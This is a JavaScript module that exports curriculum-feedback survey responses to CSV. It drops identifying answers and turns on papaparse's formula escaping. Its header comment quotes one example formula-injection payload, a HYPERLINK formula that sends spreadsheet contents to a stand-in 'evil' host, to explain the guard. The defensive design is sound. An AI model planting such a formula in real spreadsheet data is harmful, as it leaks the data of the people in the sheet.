/**
 * CSV export of raw responses (FR-42, NFR-4).
 *
 * Pure: builds a string. The caller wraps it in a Blob and clicks a link, which
 * keeps this testable in Node.
 *
 * Two hazards, both live rather than theoretical:
 *
 *  1. Formula injection. Papa.unparse quotes a cell correctly and still leaves
 *     it executable: a respondent answering `=HYPERLINK("http://evil/?d="&A1)`
 *     produces a working formula when an admin opens the file in Excel, and it
 *     can exfiltrate the rest of the sheet. escapeFormulae is papaparse's own
 *     guard and covers TAB and CR, which a hand-rolled `= + - @` check misses.
 *
 *  2. PII. Dropping user_id and email does NOT de-identify an export, because
 *     the answers themselves carry the name, SAP number and contact details —
 *     they are just ordinary questions on the form. Identity is therefore
 *     excluded by question_key, with no opt-in: NFR-4 limits personal data to
 *     admins, and a downloaded file has left the app's access controls behind.
 *     An admin who needs to contact a respondent can look them up in the app.
 */
import Papa from 'papaparse'

/**
 * Question keys whose ANSWERS are personally identifying.
 *
 * Derived from the profile fields in PRD §8. Always excluded — NFR-4 limits
 * personal data to admins, and an export leaves the app's access controls
 * behind the moment it is downloaded, so there is no opt-in.
 */
export const IDENTITY_KEYS = new Set([
  'name', 'full_name', 'sap_number', 'sap_id', 'roll_number',
  'contact_number', 'phone', 'email', 'email_address',
  'designation', 'organization', 'organisation',
  'organization_location', 'organisation_location', 'department',
  'completion_year', 'year_of_passing', 'company', 'employer_name',
])

export const COLUMNS = [
  { key: 'cycle_label', label: 'Academic year' },
  { key: 'stakeholder_type', label: 'Stakeholder' },
  { key: 'program', label: 'Program' },
  { key: 'course_title', label: 'Course' },
  { key: 'submitted_at', label: 'Submitted at' },
  { key: 'updated_at', label: 'Last edited at' },
  { key: 'question_key', label: 'Question key' },
  { key: 'question_text', label: 'Question (as answered)' },
  { key: 'question_type', label: 'Type' },
  { key: 'version_no', label: 'Question version' },
  { key: 'is_current_version', label: 'Is current wording' },
  { key: 'scale_name', label: 'Rating scale' },
  { key: 'answer_text', label: 'Answer' },
  { key: 'answer_score', label: 'Score' },
]

/**
 * Flattens one export row into the CSV column set.
 *
 * The three value columns collapse into one readable Answer plus a separate
 * Score, because a spreadsheet reader should not have to know that ratings live
 * in value_text while selects live in value_options.
 */
function toRecord(row) {
  const options = Array.isArray(row.value_options) ? row.value_options : null

  return {
    cycle_label: row.cycle_label,
    stakeholder_type: row.stakeholder_type,
    program: row.program ?? '',
    course_title: row.course_title ?? '',
    submitted_at: row.submitted_at ?? '',
    updated_at: row.updated_at ?? '',
    question_key: row.question_key,
    question_text: row.question_text,
    question_type: row.question_type,
    version_no: row.version_no,
    // FR-42: historical rewording has to be visible in the file itself,
    // otherwise two rows answering different wordings look identical.
    is_current_version: row.is_current_version ? 'yes' : 'no',
    scale_name: row.scale_name ?? '',
    answer_text: options && options.length ? options.join('; ') : (row.value_text ?? ''),
    // Empty, not 0, for a non-scoring answer: a zero would be averaged.
    answer_score: row.value_numeric === null || row.value_numeric === undefined
      ? ''
      : String(row.value_numeric),
  }
}

/**
 * @param {object[]} rows from analytics_export_rows
 * @returns {{csv: string, rowCount: number, excludedIdentityRows: number}}
 */
export function buildCsv(rows) {
  const source = (rows ?? []).filter(Boolean)

  const kept = source.filter(
    (row) => !IDENTITY_KEYS.has(String(row.question_key ?? '').toLowerCase()),
  )

  const csv = Papa.unparse(
    {
      fields: COLUMNS.map((c) => c.label),
      data: kept.map((row) => {
        const record = toRecord(row)
        return COLUMNS.map((c) => record[c.key])
      }),
    },
    // The whole reason papaparse is used here rather than a join('\n').
    { escapeFormulae: true },
  )

  return {
    csv,
    rowCount: kept.length,
    excludedIdentityRows: source.length - kept.length,
  }
}

/**
 * A UTF-8 BOM, without which Excel on Windows renders the en dashes already
 * present in the seeded option labels ("Academics – teaching") as mojibake.
 */
export const BOM = '﻿'

/** `curriculum-feedback-2025-26-student.csv` */
export function fileName({ cycleLabel = null, stakeholder = null } = {}) {
  const parts = ['curriculum-feedback']
  if (cycleLabel) parts.push(String(cycleLabel).replace(/[^\w-]+/g, '-'))
  if (stakeholder) parts.push(stakeholder)
  return `${parts.join('-').replace(/-+/g, '-')}.csv`
}
